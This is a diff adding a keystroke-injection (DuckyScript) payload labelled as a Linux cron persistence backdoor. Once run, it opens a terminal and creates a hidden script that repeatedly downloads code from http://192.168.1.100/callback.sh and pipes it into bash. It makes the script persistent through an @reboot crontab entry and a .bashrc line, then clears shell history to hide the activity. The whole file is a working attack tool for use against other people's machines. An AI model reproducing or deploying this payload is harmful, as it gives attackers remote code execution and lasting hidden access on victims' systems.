@@ -1,0 +1,50 @@
+# ============================================
+# LINUX CRON PERSISTENCE - Backdoor
+# ============================================
+# Purpose: Establish persistence via cron
+# Time: 5 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+CTRL ALT T
+DELAY 1000
+
+# Create hidden script
+STRING mkdir -p ~/.config/.system
+ENTER
+DELAY 100
+
+STRING cat > ~/.config/.system/.service.sh << 'SCRIPT'
+ENTER
+STRING #!/bin/bash
+ENTER
+STRING while true; do
+ENTER
+STRING   curl -s http://192.168.1.100/callback.sh | bash 2>/dev/null
+ENTER
+STRING   sleep 300
+ENTER
+STRING done
+ENTER
+STRING SCRIPT
+ENTER
+DELAY 200
+
+STRING chmod +x ~/.config/.system/.service.sh
+ENTER
+DELAY 100
+
+# Add to cron
+STRING (crontab -l 2>/dev/null; echo "@reboot ~/.config/.system/.service.sh") | crontab -
+ENTER
+DELAY 200
+
+# Add to bashrc
+STRING echo "~/.config/.system/.service.sh &" >> ~/.bashrc
+ENTER
+DELAY 100
+
+STRING history -c; clear; exit
+ENTER
